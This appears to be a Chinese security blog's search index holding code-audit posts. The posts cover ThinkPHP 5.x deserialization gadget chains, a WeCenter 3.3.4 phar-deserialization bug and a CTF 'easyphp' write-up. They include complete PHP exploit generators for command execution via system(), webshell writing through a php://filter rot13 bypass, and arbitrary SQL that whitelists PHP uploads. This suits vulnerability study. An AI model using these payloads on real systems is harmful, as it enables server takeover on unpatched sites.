<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[hello]]></title>
    <url>%2F2020%2F04%2F29%2Fhello%2F</url>
    <content type="text"><![CDATA[hello world]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp反序列化漏洞分析]]></title>
    <url>%2F2020%2F03%2F06%2Fthinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[5.1.x 测试环境 tp5.1.35 php7.0.9 代码分析框架最后触发执行任意命令的利用点在/thinkphp/library/think/Request.php中的filterValue函数，该函数中存在call_user_func($filter, $value);，通过反序列化我们最终可以实现对$filter, $value两个变量的控制，进而执行任意命令 从头跟一下利用链 起始触发点在thinkphp/library/think/process/pipes/Windows.php中Windows类的__destruct方法 close方法这里用不到，我们跟进一下removeFiles方法 该方法中调用了file_exists函数，通过这个函数我们可以将$filename赋值成一个对象，这样在调用file_exists函数时就会触发实例化类的__toString方法，这样可以全局搜索__toString方法来寻找利用点，这里使用到了thinkphp\library\think\model\concern\Conversion.php中的__toString方法 该方法中调用了toJson方法，跟进一下 继续跟进toArray方法，该方法中存在这样一段代码 在这里我们期望来找到形如$可控变量-&gt;方法(可控参数)这样的调用模式，这样就可以使我们跳到其他类调用其他类的方法，即使方法不可控，我们也可以调用其他类的__call方法进而继续寻找利用链，这里注意到了$relation-&gt;visible($name);这行代码，在这里$name是由$this-&gt;append来决定的，可以知道该变量是可控的，接着来看$relation，首先来看$relation = $this-&gt;getRelation($key);中的getRelation方法 该处返回值为NULL，接着进入到$relation = $this-&gt;getAttr($key);，跟进getAttr方法 该方法返回值为$value，因此接着跟进getData方法 该处返回值为$this-&gt;data[$name]，其中$name取决于$this-&gt;data，这里$this-&gt;data是可控的，那么也就意味着$relation是可控的，那么该处$relation-&gt;visible($name);的模式为$可控变量-&gt;不可控方法(可控参数)，该处的条件可以使我们调用任意不存在visible方法的类的__call方法，接着来全局搜索__call方法，在这里我们利用到了thinkphp/library/think/Request.php中的__call方法 该方法中存在call_user_func_array函数，其中第一个参数我们可以控制，第二个参数由于上面array_unshift函数的原因，其数组中第一个值固定为当前的类对象，这种情况下我们无法去直接在此处执行任意命令，因此我们需要利用此处继续寻找利用点，在Request类中可以发现有如下方法 该方法中存在着call_user_func这个函数，如果想办法来控制这个函数的两个参数就可以执行任意命令，我们需要来寻找一下何处调用了filterValue方法，这里我们选择同类下的input方法 该方法中使用array_walk_recursive函数来调用了filterValue方法，在这里$data决定着filterValue的前两个参数，我们目前无法控制，$filter决定着第三个参数，它来源于该行代码 1$filter = $this-&gt;getFilter($filter, $default); 跟进getFilter方法 可以看到$filter最终由$this-&gt;filter决定，是可控的，接着为了控制$data的值，我们需要继续寻找调用input方法的方法，这里使用了param方法 函数返回值处调用了input方法 该处$this-&gt;param可控，其值为$_GET的值，我们在访问时加上参数即可控制，但该处$name是不可控的，因此在这里需要继续寻找调用param方法的方法，在此使用了isAjax方法 该处$this-&gt;config[&#39;var_ajax&#39;]是可控的，那么param方法的$name就是可控的，因此input方法中的$name就可控了，这里就可以绕过该处代码使其不受$data = $this-&gt;getData($data, $name);的影响 目前我们可以控制$data和$filter，这也就意味着我们可以执行命令了 最后梳理下链的流程 123456789101112131415161718192021反序列化触发|(class Windows)-&gt;__destruct|(class Windows)-&gt;removeFiles|(trait Conversion)-&gt;__toString|(trait Conversion)-&gt;toJson|(trait Conversion)-&gt;toArray|(class Request)-&gt;__call|(class Request)-&gt;isAjax|(class Request)-&gt;param|(class Request)-&gt;input|(class Request)-&gt;filterValue-&gt;call_user_func() payload编写理清楚链的流程后对于payload的编写相对来说容易一些，其中在利用的过程中使用到trait Conversion与trait Attribute，他们是不能被实例化的，所以我们需要找到引用了这两个trait的类来进行实例化，这里使用了thinkphp/library/think/Model.php中的Model类 该类的类型为abstract，是一个抽象类，也是无法实例化的，这里还要继续寻找Model类的子类，搜索发现到thinkphp/library/think/model/Pivot.php中的Pivot类，因此exp编写如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpnamespace think;use think\facade\Cookie;use think\facade\Session;class Request&#123; protected $config = []; protected $hook = []; protected $filter; public function __construct()&#123; $this-&gt;filter = "system"; $this-&gt;config = ["var_ajax"=&gt;'']; $this-&gt;hook = ["visible"=&gt;[$this,"isAjax"]]; &#125;&#125;namespace think;abstract class Model&#123; private $data = []; protected $append = []; public function __construct()&#123; $this-&gt;append=['a'=&gt;['b'=&gt;'c']]; $this-&gt;data = ['a'=&gt;new Request()]; &#125;&#125;namespace think\process\pipes;abstract class Pipes&#123;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;namespace think\process\pipes;use think\Process;//use think\model\concern\Conversion;use think\model\Pivot;class Windows&#123; private $files = []; public function __construct()&#123; $this-&gt;files = [new Pivot()]; &#125;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows())); 利用截图 参考链接 https://xz.aliyun.com/t/6467 https://paper.seebug.org/1040/ 5.2.x 测试环境 tp5.2.0 php7.3.4 代码分析5.2.0版本的链在前半部分与5.1版本相同，通过vendor/topthink/framework/src/think/process/pipes/Windows.php中的windows类的__destruct方法触发，接着通过removeFiles方法触发vendor/topthink/framework/src/think/model/concern/Conversion.php中Conversion的__toString方法 跟进toJson方法 继续跟进toArray方法，需要关注下面的代码段 跟进这个getAttr方法 它的返回值是另一个方法的返回值，跟进这个方法 在该方法中存在着$value = $closure($value, $this-&gt;data);这样一处动态调用，我们可以探究一下$closure，$value，$this-&gt;data这三处是否可控，其中$this-&gt;data是直接可控的 那么来看$closure，其值由$this-&gt;withAttr[$fieldName];决定的，其中$this-&gt;withAttr是可控的，现在需要知道$fieldName是否可控，$fieldName的值由$this-&gt;getRealFieldName($name);决定，跟进getRealFieldName方法 这里的$this-&gt;strict默认值为true，那么该函数的返回值为$name，该变量是getValue方法的第一个参数，也就是getAttr方法的参数，如下图 在toArray方法中，该参数为$data的一个键值，如图 在这里可以看到$data是可控的，那么意味着$closure是可控的 接着看一下$value，在getValue方法中，$relation为flase，所以这里的$value是当作参数传进来的，如图 向前面找可以看到$value是getData方法的返回值，如图 跟进该方法 该处$fieldName, $this-&gt;data都是可控的，这意味着$value是可控的，在这里$closure($value, $this-&gt;data);就完全可控了，我们可以构造如下的动态调用来执行系统命令 payload编写有了上面的分析流程，结合分析5.1的经验，很容易编写 12345678910111213141516171819202122232425262728293031323334&lt;?phpnamespace think;abstract class Model&#123; private $withAttr = []; private $data = []; private $relation = []; function __construct()&#123; $this-&gt;relation = ['yemoli'=&gt;'whoami']; $this-&gt;data = array(); $this-&gt;withAttr = ['yemoli'=&gt;'system']; &#125;&#125;namespace think\process\pipes;use think\model\concern\Conversion;use think\model\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows()));?&gt; 参考链接 https://xz.aliyun.com/t/6476 5.0.24 测试环境 Linux php5.6 tp5.0.24 代码分析该版本下利用方式是通过反序列化达到写文件的目的，我们来跟一下链 开始位置同样是位于thinkphp/library/think/process/pipes/Windows.php中的windows类的__destruct方法，该方法调用removeFiles方法，利用removeFiles可以实现对任意类__toString方法的触发，这里选择触发位于thinkphp/library/think/Model.php中的Model类的__toString方法 1234public function __toString()&#123; return $this-&gt;toJson();&#125; 跟进toJson方法 1234public function toJson($options = JSON_UNESCAPED_UNICODE)&#123; return json_encode($this-&gt;toArray(), $options);&#125; 继续跟进toArray，列出关键代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public function toArray()&#123; $item = []; $visible = []; $hidden = []; $data = array_merge($this-&gt;data, $this-&gt;relation); ..... ..... ..... // 追加属性（必须定义获取器） if (!empty($this-&gt;append)) &#123; foreach ($this-&gt;append as $key =&gt; $name) &#123; if (is_array($name)) &#123; // 追加关联对象属性 $relation = $this-&gt;getAttr($key); $item[$key] = $relation-&gt;append($name)-&gt;toArray(); &#125; elseif (strpos($name, '.')) &#123; list($key, $attr) = explode('.', $name); // 追加关联对象属性 $relation = $this-&gt;getAttr($key); $item[$key] = $relation-&gt;append([$attr])-&gt;toArray(); &#125; else &#123; $relation = Loader::parseName($name, 1, false); if (method_exists($this, $relation)) &#123; $modelRelation = $this-&gt;$relation(); $value = $this-&gt;getRelationData($modelRelation); if (method_exists($modelRelation, 'getBindAttr')) &#123; $bindAttr = $modelRelation-&gt;getBindAttr(); if ($bindAttr) &#123; foreach ($bindAttr as $key =&gt; $attr) &#123; $key = is_numeric($key) ? $attr : $key; if (isset($this-&gt;data[$key])) &#123; throw new Exception('bind attr has exists:' . $key); &#125; else &#123; $item[$key] = $value ? $value-&gt;getAttr($attr) : null; &#125; &#125; continue; &#125; &#125; $item[$name] = $value; &#125; else &#123; $item[$name] = $this-&gt;getAttr($name); &#125; &#125; &#125; &#125; return !empty($item) ? $item : [];&#125; 我们的目的是到达如下代码段 我在该函数中对于__call方法的触发不同于参考文章，直接跟进getRelationData方法 123456789101112131415protected function getRelationData(Relation $modelRelation) &#123; if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) &#123; echo "&lt;br&gt;fuction called"; $value = $this-&gt;parent; &#125; else &#123; // 首先获取关联数据 if (method_exists($modelRelation, 'getRelation')) &#123; $value = $modelRelation-&gt;getRelation(); &#125; else &#123; throw new BadMethodCallException('method not exists:' . get_class($modelRelation) . '-&gt; getRelation'); &#125; &#125; return $value; &#125; 这里我们注意下$modelRelation参数，他的值由$modelRelation = $this-&gt;$relation();这句得到，$relation值由$name决定，$name值由$this-&gt;append决定，是可控的，那么这里我们就可以调用我们可控的方法，这里选择Modle类中的getError方法,因为其返回值直接可控 1234public function getError()&#123; return $this-&gt;error;&#125; 在这里$modelRelation就是完全可控的，在getRelationData方法中，执行到$value = $modelRelation-&gt;getRelation();时，就可以执行任意类的getRelation方法，这里选择位于thinkphp/library/think/model/relation/HasOne.php的HasOne类的getRelation方法 1234567891011121314151617181920public function getRelation($subRelation = '', $closure = null)&#123; // 执行关联定义方法 $localKey = $this-&gt;localKey; if ($closure) &#123; call_user_func_array($closure, [ &amp; $this-&gt;query]); &#125; // 判断关联类型执行查询 $relationModel = $this-&gt;query -&gt;removeWhereField($this-&gt;foreignKey) -&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;$localKey) -&gt;relation($subRelation) -&gt;find(); if ($relationModel) &#123; $relationModel-&gt;setParent(clone $this-&gt;parent); &#125; return $relationModel;&#125; 关注如下代码段 12345$relationModel = $this-&gt;query -&gt;removeWhereField($this-&gt;foreignKey) -&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;$localKey) -&gt;relation($subRelation) -&gt;find(); 这里$this-&gt;query可控，$this-&gt;foreignKey可控，这样就可以触发任意不存在removeWhereField方法的类的__call方法，这里选择触发位于thinkphp/library/think/console/Output.php的Output类的__call方法 12345678910111213141516 public function __call($method, $args) &#123; var_dump($args); if (in_array($method, $this-&gt;styles)) &#123; array_unshift($args, $method);//$args-&gt;class Relation-&gt;$foreignKey return call_user_func_array([$this, 'block'], $args); &#125; if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) &#123; return call_user_func_array([$this-&gt;handle, $method], $args); &#125; else &#123; throw new Exception('method not exists:' . __CLASS__ . '-&gt;' . $method); &#125; &#125;&#125; 接着由于return call_user_func_array([$this, &#39;block&#39;], $args);会触发block方法 1234protected function block($style, $message)&#123; $this-&gt;writeln("&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;");&#125; 跟进writeln方法 1234public function writeln($messages, $type = self::OUTPUT_NORMAL)&#123; $this-&gt;write($messages, true, $type);&#125; 跟进write方法 1234public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)&#123; $this-&gt;handle-&gt;write($messages, $newline, $type);&#125; 这里$this-&gt;handle可控，我们又可以实现对任意类的write方法的调用，这里选择位于think/session/driver/Memcache.php的Memcache类的write方法 1234public function write($sessID, $sessData)&#123; return $this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']);&#125; 同样的$this-&gt;handler可控，这样我们可以调用其他类的set方法，这里选择位于thinkphp/library/think/cache/driver/File.php的File类的set方法 123456789101112131415161718192021222324252627public function set($name, $value, $expire = null)&#123; if (is_null($expire)) &#123; $expire = $this-&gt;options['expire']; &#125; if ($expire instanceof \DateTime) &#123; $expire = $expire-&gt;getTimestamp() - time(); &#125; $filename = $this-&gt;getCacheKey($name, true); if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123; $first = true; &#125; $data = serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) &#123; //数据压缩 $data = gzcompress($data, 3); &#125; $data = "&lt;?php\n//" . sprintf('%012d', $expire) . "\n exit();?&gt;\n" . $data; $result = file_put_contents($filename, $data); if ($result) &#123; isset($first) &amp;&amp; $this-&gt;setTagItem($filename); clearstatcache(); return true; &#125; else &#123; return false; &#125;&#125; 这也是该链写文件的部分，看一下file_put_contents($filename, $data);的两个参数 12$filename = $this-&gt;getCacheKey($name, true);$data = serialize($value); 先看$filename，跟进getCacheKey方法 123456789101112131415161718protected function getCacheKey($name, $auto = false)&#123; $name = md5($name); if ($this-&gt;options['cache_subdir']) &#123; // 使用子目录 $name = substr($name, 0, 2) . DS . substr($name, 2); &#125; if ($this-&gt;options['prefix']) &#123; $name = $this-&gt;options['prefix'] . DS . $name; &#125; $filename = $this-&gt;options['path'] . $name . '.php'; $dir = dirname($filename); if ($auto &amp;&amp; !is_dir($dir)) &#123; mkdir($dir, 0755, true); &#125; return $filename;&#125; $filename是由$this-&gt;options[&#39;path&#39;]和$name组成的，是可控的，那么$filename就是可控的，其中md5值我们可以自己算出来 然后看一下$data，其值由$value决定，向上回溯会发现，该值的类型是布尔类型，也就是说我们在此处无法控制$data的值，那么目前我们无法写任意shell，于是接着回到set方法中，注意到该条语句$this-&gt;setTagItem($filename);，跟进setTagItem方法 123456789101112131415protected function setTagItem($name)&#123; if ($this-&gt;tag) &#123; $key = 'tag_' . md5($this-&gt;tag); $this-&gt;tag = null; if ($this-&gt;has($key)) &#123; $value = explode(',', $this-&gt;get($key)); $value[] = $name; $value = implode(',', array_unique($value)); &#125; else &#123; $value = $name; &#125; $this-&gt;set($key, $value, 0); &#125;&#125; 该方法中最后重新调用了set方法，其中$key = &#39;tag_&#39; . md5($this-&gt;tag);中$this-&gt;tag可控，则$key可控，而$value = $name，$name是刚刚的$filename，那么$value也是可控的，在此我们在这里再次调用set方法，同时也能完全控制写入的文件名和文件内容，在写入文件内容时可以注意到如下语句 1$data = "&lt;?php\n//" . sprintf('%012d', $expire) . "\n exit();?&gt;\n" . $data; 我们需要消除该处exit()方法的限制，这里我们可以使用伪协议+rot13编码绕过 payload编写123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&lt;?phpnamespace think\session\driver;use think\cache\driver\File;class Memcached&#123; protected $handler = null; function __construct()&#123; $this-&gt;handler = new File(); &#125;&#125;namespace think\cache;abstract class Driver&#123; //protected $tag; function __construct()&#123; //$this-&gt;tag = 'nocatch'; &#125;&#125;namespace think\cache\driver;use think\cache\Driver;class File extends Driver&#123; protected $tag; protected $options = []; function __construct()&#123; $this-&gt;tag = 'nocatch'; $this-&gt;options = [ 'cache_subdir'=&gt;false, 'prefix'=&gt;'', 'path'=&gt;'php://filter/write=string.rot13/resource=./static/&lt;?cuc cucvasb();?&gt;', 'data_compress'=&gt;false, ]; &#125;&#125;namespace think\console;use think\session\driver\Memcached;class Output&#123; private $handle = null; protected $styles = []; function __construct()&#123; $this-&gt;styles = ['removeWhereField']; $this-&gt;handle = new Memcached(); &#125;&#125;namespace think\model;use think\console\Output;abstract class Relation&#123; protected $query; protected $foreignKey; function __construct()&#123; $this-&gt;query = new Output(); $this-&gt;foreignKey = "aaaaaaaaa"; &#125;&#125;namespace think\model\relation;use think\model\Relation;abstract class OneToOne extends Relation&#123;&#125;namespace think\model\relation;class HasOne extends OneToOne&#123; &#125;namespace think;use think\model\relation\HasOne;use think\console\Output;abstract class Model&#123; protected $append = []; protected $error; protected $parent; function __construct()&#123; $this-&gt;append = ['yemoli'=&gt;'getError']; $this-&gt;error = new HasOne(); &#125;&#125;namespace think\process\pipes;use think\model\concern\Conversion;use think\model\Pivot;class Windows&#123; private $files = []; public function __construct() &#123; $this-&gt;files=[new Pivot()]; &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo base64_encode(serialize(new Windows()));?&gt; 参考链接 https://www.anquanke.com/post/id/196364an]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WeCenter V3.3.4漏洞复现]]></title>
    <url>%2F2020%2F02%2F29%2FWeCenter-V3-3-4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言该漏洞的实质触发原因是由于可以通过反序列化来执行任意sql语句，导致可以在数据库中更改上传文件的限制类型，最后达到可以上传任意PHP文件的效果 代码分析漏洞利用点文件位置在./system/aws_model.inc.php，该文件中存在一个AWS_MODEL类，重点关注一下该类的__destruct方法 该方法遍历了$_shutdown_query，然后执行了query方法，跟进去看一下 该方法的功能是执行传入的SQL语句，那么也就是说我们只要控制了$_shutdown_query就可以执行任意的语句了，可以注意到该变量是该类中的私有成员变量 如果存在反序列化的点，我们就可以控制$_shutdown_query的值来执行任意SQL语句，于是接着来寻找反序列化的触发方法 在本例中反序列化是利用phar进行触发的，触发点文件在./models/account.php，在该文件的account_class类中，存在着这样一个函数 如果该函数中的$headimgurl是可控的，就可以通过file_get_contents函数来触发phar反序列化，通过搜索发现在./app/account/ajax.php中的synch_img_action函数调用了associate_remote_avatar函数 在这里我们需要控制的是$wxuser[&#39;headimgurl&#39;]，而synch_img_action对于$wxuser[&#39;headimgurl&#39;]的获取是来源于数据库中的users_weixin表的，所以我们想控制其值必须找到对users_weixin表中headimgurl字段操作的代码，通过搜索发现./models/openid/weixin/weixin.php文件中bind_account函数存在着对该表的插入操作 接下来需要找到bind_account函数的调用位置，并且需要使其参数可控，通过搜索关注到binding_action函数，该函数在/app/m/weixin.php文件中 可以看到该函数中在调用bind_account函数传入参数时，参数的值都是从cookie中获取的，这样我们就可以通过cookie来控制传入的参数值，而binding_action这个方法可以通过路由访问直接调用，所以我们基本上就可以来执行任意SQL语句了 接着来梳理一下流程，首先我们控制cookie然后调用binding_action函数，使其调用bind_account函数并带入我们控制的参数，该函数将会把我们构造的headimgurl插入到数据库中，在我们调用synch_img_action方法时，该方法会将headimgurl取出来并调用associate_remote_avatar函数，该函数会调用file_get_contents($headimgurl)来触发phar反序列化，进而执行任意sql语句 实际测试下面首先编写反序列化的生成代码 1234567891011121314&lt;?phpclass AWS_MODEL&#123; private $_shutdown_query = array(); function __construct()&#123; $this-&gt;_shutdown_query = array("a"=&gt;"SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)"); &#125;&#125;$phar = new Phar("phar.phar"); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub$o = new AWS_MODEL();$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件$phar-&gt;stopBuffering(); 在提问的编辑器处进行文件上传，会返回文件路径 然后编写生成cookie的代码 1234567&lt;?php $a = array(); $a['access_token'] = array('openid' =&gt; '1'); $a['access_user'] = array('openid'=&gt;1,'nickname'=&gt;'aaa','headimgurl'=&gt;'phar://uploads/question/20200229/f3f9cb0f135c2fd37c2446f863cc15d6.gif'); echo json_encode($a);?&gt;//&#123;"access_token":&#123;"openid":"1"&#125;,"access_user":&#123;"openid":1,"nickname":"aaa","headimgurl":"phar:\/\/uploads\/question\/20200229\/f3f9cb0f135c2fd37c2446f863cc15d6.gif"&#125;&#125; 首先带着cookie调用binding_action方法，注意一下cookie的前缀需要抓包获取 然后去直接触发synch_img_action方法，就可以通过报错函数来得到sql执行结果 深入分析登陆后台可以发现允许上传的文件类型是保存在数据库中的，执行更新后缀名的语句如下 我们可以仿照该语句来将php后缀名加入其中 1234567891011121314&lt;?phpclass AWS_MODEL&#123; private $_shutdown_query = array(); function __construct()&#123; $this-&gt;_shutdown_query = array("a"=&gt;"UPDATE `aws_system_setting` SET `value` = 's:45:\"jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php\";' WHERE (`varname` = 'allowed_upload_types')"); &#125;&#125;$phar = new Phar("phar.phar"); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub$o = new AWS_MODEL();$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString("test.txt", "test"); //添加要压缩的文件$phar-&gt;stopBuffering(); 按照上面的执行语句的流程，成功执行后即可将php后缀添加到白名单中，之后在编辑器中可直接上传php文件 参考链接 https://xz.aliyun.com/t/7077 https://mp.weixin.qq.com/s/uBmo9xXMVk42Qp3BP_x0Vw]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[春秋战“疫”easyphp题解]]></title>
    <url>%2F2020%2F02%2F26%2F%E6%98%A5%E7%A7%8B%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9Deasyphp%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[题目考点： 反序列化POP链构造 反序列化字符串逃逸 题目源码12345678910111213141516//index.php&lt;?phprequire_once "lib.php";if(isset($_GET['action']))&#123; require_once(__DIR__."/".$_GET['action'].".php");&#125;else&#123; if($_SESSION['login']==1)&#123; echo "&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;"; &#125; else&#123; echo "&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;"; &#125;&#125;?&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124//lib.php&lt;?phperror_reporting(0);session_start();function safe($parm)&#123; $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter"); return str_replace($array,'hacker',$parm);&#125;class User&#123; public $id; public $age=null; public $nickname=null; public function login() &#123; if(isset($_POST['username'])&amp;&amp;isset($_POST['password']))&#123; $mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login('select id,password from user where username=?'); if($this-&gt;id)&#123; $_SESSION['id']=$this-&gt;id; $_SESSION['login']=1; echo "你的ID是".$_SESSION['id']; echo "你好！".$_SESSION['token']; echo "&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"; return $this-&gt;id; &#125; &#125;&#125; public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']); //这个功能还没有写完 先占坑 &#125; public function getNewInfo()&#123; $age=$_POST['age']; $nickname=$_POST['nickname']; echo safe(serialize(new Info($age,$nickname))); return safe(serialize(new Info($age,$nickname))); &#125; public function __destruct()&#123; return file_get_contents($this-&gt;nickname);//危 &#125; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return "0-0"; &#125;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125;class dbCtrl&#123; public $hostname="127.0.0.1"; public $dbuser="root"; public $dbpass="root"; public $database="test"; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST['username']; $this-&gt;password=$_POST['password']; $this-&gt;token=$_SESSION['token']; &#125; public function login($sql) &#123; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die("连接失败，错误:" . $this-&gt;mysqli-&gt;connect_error); &#125; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') &#123; return $idResult; &#125; if (!$idResult) &#123; echo('用户不存在!'); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo('密码错误！'); return false; &#125; $_SESSION['token']=$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; //还没来得及写 &#125;&#125; 1234567891011121314151617181920//update.php&lt;?phprequire_once('lib.php');echo '&lt;html&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;update&lt;/title&gt;&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;&lt;/html&gt;';if ($_SESSION['login']!=1)&#123; echo "你还没有登陆呢！";&#125;$users=new User();$users-&gt;update();if($_SESSION['login']===1)&#123; require_once("flag.php"); echo $flag;&#125;?&gt; 题目分析题目获取到flag的条件是需要使用admin登陆，我们需要找到可控点来执行我们的sql语句，首先就是pop链的寻找 值得注意的是dbCtrl类中的login方法，该处可以执行任意sql语句，在满足某些条件时可以返回执行的部分结果 那么我们向上寻找如何可以触发该处函数，注意到Info类中的__call方法，我们可以将CtrlCase赋值为一个dbCtrl类的对象 接着寻找如何触发__call方法，可以看到User类的__toString 方法满足该条件,只需要将nickname赋值为一个Info类的对象即可 触发__toString的方式也很简单，在UpdateHelper类中将sql变量赋值为User类的对象，这样该类在触发destruct方法的时候会自动触发__toString方法 现在理一下pop链的顺序 1234-&gt;UpdateHelper(__destruct) $sql=new User-&gt;User(__toString) $nickname=new Info $age="select password from user where username=?"-&gt;Info(__call) $CtrlCase=new dbCtrl-&gt;dbCtrl(login) 下面需要寻找一下触发反序列化的位置，通过update.php中的代码可以定位到触发点在User类的update方法 接着跟到getNewinfo方法，该处接收两个参数并且经过一个safe函数的过滤 这里就涉及到了字符串的逃逸，通过safe函数的过滤使前后字符串的长度不同造成逃逸，我们先来生成所需要的反序列化内容 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpclass User&#123; public $id; public $age; public $nickname; public function __construct($age,$nickname)&#123; $this-&gt;age="select password,id from user where username=?"; $this-&gt;nickname=new Info(); &#125; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age); //return "0-0"; &#125;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; $this-&gt;CtrlCase=new dbCtrl; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125;&#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); $this-&gt;sql= new user; &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125;class dbCtrl&#123; public $name; public $token; public function __construct()&#123; $this-&gt;name='admin'; $this-&gt;token = 'admin'; &#125; &#125;$a = new UpdateHelper;echo serialize($a); 得到 1O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125; getNewInfo方法默认返回的内容 1O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";N;&#125; 这里我们来控制nickname，那么我们需要逃逸出来的字符串为 1";s:8:"CtrlCase";O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125; 计算一下他们的长度然后进行填充 1234&lt;?php$b = 'O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125;';$a = '";s:8:"CtrlCase";'.$b;echo strlen($a); 长度305 这里使用union来进行替换，则需要305个union 最后的payload 